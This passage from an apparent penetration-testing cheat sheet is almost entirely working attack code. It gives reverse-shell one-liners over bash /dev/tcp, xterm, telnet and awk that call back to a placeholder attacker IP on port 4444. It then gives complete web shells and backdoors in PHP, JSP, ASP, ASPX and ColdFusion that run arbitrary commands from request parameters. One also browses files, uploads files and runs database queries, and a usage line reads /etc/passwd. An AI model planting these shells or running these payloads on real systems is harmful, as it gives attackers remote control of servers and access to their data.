<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="nc">String</span><span class="o">[])</span>
<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
</code></pre></div>

<h2>Xterm</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Yes, xterm sessions work too:</span>
xterm <span class="nt">-display</span> &lt;IP&gt;:1 <span class="c"># connect to you on port 6001</span>

<span class="c"># Then, catch the incoming xterm on your attack box:</span>
Xnest :1

<span class="c"># Authorize the target to connect to you:</span>
xhost +&lt;target_IP&gt;
</code></pre></div>

<h2>Telnet</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span><span class="p">;</span><span class="nb">mkfifo</span> <span class="nv">$TF</span> <span class="o">&amp;&amp;</span> telnet &lt;IP&gt; 4444 0&lt;<span class="nv">$TF</span> | sh 1&gt;<span class="nv">$TF</span>
</code></pre></div>

<h2>Awk</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">awk</span> <span class="s1">'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/4444"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
</code></pre></div>

<h2>Web shells</h2>

<p>Default webroots for each web servers:</p>

<ul>
<li>Apache: <code>/var/www/html/</code></li>
<li>Nginx: <code>/usr/local/nginx/html/</code></li>
<li>IIS: <code>c:\inetpub\wwwroot\</code></li>
<li>XAMPP: <code>C:\xampp\htdocs\</code></li>
</ul>

<h3>PHP</h3>

<p>With GET parameter:</p>

<div class="highlight"><pre class="highlight php"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div>

<p>Another one with GET parameter:</p>

<div class="highlight"><pre class="highlight php"><code><span class="c">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>

<span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div>

<p>With a web prompt:</p>

<div class="highlight"><pre class="highlight php"><code><span class="cp">&lt;?</span>
<span class="c1">// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\</span>

<span class="nb">ob_implicit_flush</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'f'</span><span class="p">])){</span>
        <span class="nv">$filename</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'f'</span><span class="p">];</span>
        <span class="nv">$file</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">);</span>
    <span class="k">print</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nb">fpassthru</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="k">print</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'d'</span><span class="p">])){</span>
        <span class="nv">$d</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'d'</span><span class="p">];</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="s2">"</span><span class="nv">$d</span><span class="s2">"</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">echo</span> <span class="s2">"&lt;h2&gt;listing of </span><span class="nv">$d</span><span class="s2">&lt;/h2&gt;&lt;hr&gt;"</span><span class="p">;</span>
                   <span class="k">while</span> <span class="p">(</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)){</span> 
                    <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="s2">"</span><span class="nv">$d</span><span class="s2">/</span><span class="nv">$dir</span><span class="s2">"</span><span class="p">))</span> <span class="nv">$type</span><span class="o">=</span><span class="s2">"dir"</span><span class="p">;</span>
            <span class="k">else</span> <span class="nv">$type</span><span class="o">=</span><span class="s2">"file"</span><span class="p">;</span>

            <span class="nv">$files</span><span class="p">[</span><span class="nv">$dir</span><span class="p">]</span><span class="o">=</span><span class="nv">$type</span><span class="p">;</span>
                <span class="p">}</span>
     <span class="nb">ksort</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$t</span> <span class="o">==</span> <span class="s2">"dir"</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="s2">"&lt;a href='</span><span class="nv">$PHP_SELF</span><span class="s2">?d=</span><span class="nv">$d</span><span class="s2">/</span><span class="nv">$f</span><span class="s2">'&gt;&lt;font color=grey&gt;</span><span class="nv">$f</span><span class="s2">/&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;a href='</span><span class="nv">$PHP_SELF</span><span class="s2">?f=</span><span class="nv">$d</span><span class="s2">/</span><span class="nv">$f</span><span class="s2">'&gt;&lt;font color=black&gt;</span><span class="nv">$f</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s2">"opendir() failed"</span><span class="p">;</span>
        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
        <span class="k">die</span> <span class="p">(</span><span class="s2">"&lt;hr&gt;"</span><span class="p">);</span> 
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
    <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
    <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span>        
    <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'upload'</span><span class="p">])){</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="s1">'hey,specify directory!'</span><span class="p">);</span>
            <span class="k">else</span> <span class="nv">$dir</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">];</span>
        <span class="nv">$fname</span><span class="o">=</span><span class="nv">$HTTP_POST_FILES</span><span class="p">[</span><span class="s1">'file_name'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$HTTP_POST_FILES</span><span class="p">[</span><span class="s1">'file_name'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="s2">"</span><span class="nv">$dir$fname</span><span class="s2">"</span><span class="p">))</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'file uploading error.'</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'mquery'</span><span class="p">])){</span>

    <span class="nv">$host</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
    <span class="nv">$usr</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'usr'</span><span class="p">];</span>
    <span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">];</span>
    <span class="nv">$db</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'db'</span><span class="p">];</span>
    <span class="nv">$mquery</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'mquery'</span><span class="p">];</span>
    <span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">"</span><span class="nv">$host</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="nv">$usr</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="nv">$passwd</span><span class="s2">"</span><span class="p">)</span> <span class="k">or</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Could not connect: "</span> <span class="mf">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">"</span><span class="nv">$db</span><span class="s2">"</span><span class="p">);</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"</span><span class="nv">$mquery</span><span class="s2">"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="o">!=</span><span class="kc">FALSE</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">"&lt;pre&gt;&lt;h2&gt;query was executed correctly&lt;/h2&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="no">MYSQL_ASSOC</span><span class="p">))</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>  
    <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
    <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$curdir</span> <span class="o">=</span> <span class="nb">getcwd</span><span class="p">();</span>
<span class="k">print</span> <span class="s2">"Current directory is: </span><span class="nv">$curdir</span><span class="s2">&lt;br /&gt;"</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^[a-zA-Z]:\//"</span><span class="p">,</span> <span class="nv">$curdir</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"Browse: &lt;a href=</span><span class="se">\"</span><span class="s2">?d=</span><span class="nv">$match[0]</span><span class="se">\"</span><span class="s2">&gt;/&lt;/a&gt;&lt;br /&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"Browse: &lt;a href=</span><span class="se">\"</span><span class="s2">?d=/</span><span class="se">\"</span><span class="s2">&gt;/&lt;/a&gt;&lt;br /&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="k">print</span> <span class="s2">"Browse: &lt;a href=</span><span class="se">\"</span><span class="s2">?d=</span><span class="nv">$curdir</span><span class="se">\"</span><span class="s2">&gt;</span><span class="nv">$curdir</span><span class="s2">&lt;/a&gt;&lt;br /&gt;&lt;hr&gt;"</span><span class="p">;</span>

<span class="cp">?&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?</span> <span class="k">echo</span> <span class="nv">$PHP_SELF</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="nt">&gt;</span>execute command: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"c"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"go"</span><span class="nt">&gt;&lt;hr&gt;&lt;/form&gt;</span> 
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;form</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$PHP_SELF</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"MAX_FILE_SIZE"</span> <span class="na">value=</span><span class="s">"1000000000"</span><span class="nt">&gt;</span>
upload file:<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"file_name"</span> <span class="na">type=</span><span class="s">"file"</span><span class="nt">&gt;</span>   to dir: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"dir"</span><span class="nt">&gt;</span><span class="ni">&amp;nbsp;&amp;nbsp;</span><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"upload"</span> <span class="na">value=</span><span class="s">"upload"</span><span class="nt">&gt;&lt;/form&gt;</span>
<span class="nt">&lt;hr&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
To browse:<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;hr&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
Execute mysql query:
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?</span> <span class="k">echo</span> <span class="nv">$PHP_SELF</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="nt">&gt;</span>
host:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"host"</span><span class="na">value=</span><span class="s">"localhost"</span><span class="nt">&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
user: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"usr"</span> <span class="na">value=</span><span class="s">root</span><span class="nt">&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"passwd"</span><span class="nt">&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
database: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"db"</span><span class="nt">&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
query: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"mquery"</span><span class="nt">&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"execute"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div>

<h3>JSP</h3>

<p>With GET parameter, simple:</p>

<div class="highlight"><pre class="highlight jsp"><code><span class="nt">&lt;%</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span> <span class="nt">%&gt;</span>
</code></pre></div>

<p>With GET parameter, for Unix targets:</p>

<div class="highlight"><pre class="highlight jsp"><code>// note that linux = cmd and windows = "cmd.exe /c + cmd" 
<span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="na">ACTION=</span><span class="s">'cmdjsp.jsp'</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">name=</span><span class="s">'cmd'</span> <span class="na">type=</span><span class="s">text</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">'Run'</span><span class="nt">&gt;</span>
<span class="nt">&lt;/FORM&gt;</span>
<span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
   <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
   <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
      <span class="k">try</span> <span class="o">{</span>
         <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"cmd "</span> <span class="o">+</span> <span class="n">cmd</span><span class="o">);</span>
         <span class="nc">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
         <span class="k">while</span><span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">output</span> <span class="o">+=</span> <span class="n">s</span><span class="o">;</span>
         <span class="o">}</span>
      <span class="o">}</span>
      <span class="k">catch</span><span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
         <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
   <span class="o">}</span>
<span class="nt">%&gt;</span>
<span class="nt">&lt;pre&gt;</span>
<span class="nt">&lt;%=</span><span class="n">output</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;/pre&gt;</span>
<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div>

<p>With GET parameter, for Windows targets:</p>

<div class="highlight"><pre class="highlight jsp"><code>// note that linux = cmd and windows = "cmd.exe /c + cmd" 
<span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="na">ACTION=</span><span class="s">'cmdjsp.jsp'</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">name=</span><span class="s">'cmd'</span> <span class="na">type=</span><span class="s">text</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">'Run'</span><span class="nt">&gt;</span>
<span class="nt">&lt;/FORM&gt;</span>
<span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
   <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
   <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
      <span class="k">try</span> <span class="o">{</span>
         <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"cmd.exe /C "</span> <span class="o">+</span> <span class="n">cmd</span><span class="o">);</span>
         <span class="nc">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
         <span class="k">while</span><span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">output</span> <span class="o">+=</span> <span class="n">s</span><span class="o">;</span>
         <span class="o">}</span>
      <span class="o">}</span>
      <span class="k">catch</span><span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
         <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
   <span class="o">}</span>
<span class="nt">%&gt;</span>
<span class="nt">&lt;pre&gt;</span>
<span class="nt">&lt;%=</span><span class="n">output</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;/pre&gt;</span>
<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div>

<h3>ASP</h3>

<p>With GET parameter:</p>

<div class="highlight"><pre class="highlight plaintext"><code>&lt;% eval request("cmd") %&gt;
</code></pre></div>

<p>With a web prompt:</p>

<div class="highlight"><pre class="highlight plaintext"><code>&lt;%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&gt;


&lt;HTML&gt;
&lt;BODY&gt;
&lt;FORM action="" method="GET"&gt;
&lt;input type="text" name="cmd" size=45 value="&lt;%= szCMD %&gt;"&gt;
&lt;input type="submit" value="Run"&gt;
&lt;/FORM&gt;
&lt;PRE&gt;
&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
&lt;%Response.Write(Request.ServerVariables("server_name"))%&gt;
&lt;p&gt;
&lt;b&gt;The server's port:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables("server_port"))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables("server_software"))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%&gt;
&lt;% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" &amp; szCMD)
Response.Write(thisDir)%&gt;
&lt;/p&gt;
&lt;br&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre></div>

<p>Another one with a web prompt:</p>

<div class="highlight"><pre class="highlight plaintext"><code>&lt;%@ Language=VBScript %&gt;
&lt;%
  ' --------------------o0o--------------------
  '  File:    CmdAsp.asp
  '  Author:  Maceo &lt;maceo @ dogmile.com&gt;
  '  Release: 2000-12-01
  '  OS:      Windows 2000, 4.0 NT
  ' -------------------------------------------
  Dim oScript
  Dim oScriptNet
  Dim oFileSys, oFile
  Dim szCMD, szTempFile

  On Error Resume Next

  ' -- create the COM objects that we will be using -- '
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  ' -- check for a command that we have posted -- '
  szCMD = Request.Form(".CMD")
  If (szCMD &lt;&gt; "") Then

    ' -- Use a poor man's pipe ... a temp file -- '
    szTempFile = "C:\" &amp; oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " &amp; szCMD &amp; " &gt; " &amp; szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)

  End If
%&gt;
&lt;HTML&gt;
&lt;BODY&gt;
&lt;FORM action="&lt;%= Request.ServerVariables("URL") %&gt;" method="POST"&gt;
&lt;input type=text name=".CMD" size=45 value="&lt;%= szCMD %&gt;"&gt;
&lt;input type=submit value="Run"&gt;
&lt;/FORM&gt;
&lt;PRE&gt;
&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
&lt;br&gt;
&lt;%
  If (IsObject(oFile)) Then
    ' -- Read the output from our command and remove the temp file -- '
    On Error Resume Next
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
&lt;!--    http://michaeldaw.org   2006    --&gt;
</code></pre></div>

<h3>ASPX</h3>

<p>With a web prompt:</p>

<div class="highlight"><pre class="highlight plaintext"><code>&lt;%@ Page Language="C#" Debug="true" Trace="false" %&gt;
&lt;%@ Import Namespace="System.Diagnostics" %&gt;
&lt;%@ Import Namespace="System.IO" %&gt;
&lt;script Language="c#" runat="server"&gt;
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("&lt;pre&gt;");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("&lt;/pre&gt;");
}
&lt;/script&gt;
&lt;HTML&gt;
&lt;HEAD&gt;
&lt;title&gt;awen asp.net webshell&lt;/title&gt;
&lt;/HEAD&gt;
&lt;body &gt;
&lt;form id="cmd" method="post" runat="server"&gt;
&lt;asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;
&lt;asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;
&lt;asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server"&gt;Command:&lt;/asp:Label&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/HTML&gt;
&lt;!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --&gt;
&lt;!--    http://michaeldaw.org   04/2007    --&gt;
</code></pre></div>

<h3>ColdFusion</h3>

<p>With a web prompt:</p>

<div class="highlight"><pre class="highlight plaintext"><code>&lt;html&gt;
&lt;body&gt;
&lt;!-- Contributed by Kurt Grutzmacher () --&gt;
Notes:&lt;br&gt;&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;Prefix DOS commands with "c:\windows\system32\cmd.exe /c &amp;lt;command&amp;gt;" or wherever cmd.exe is&lt;br&gt;
&lt;li&gt;Options are, of course, the command line options you want to run
&lt;li&gt;CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it
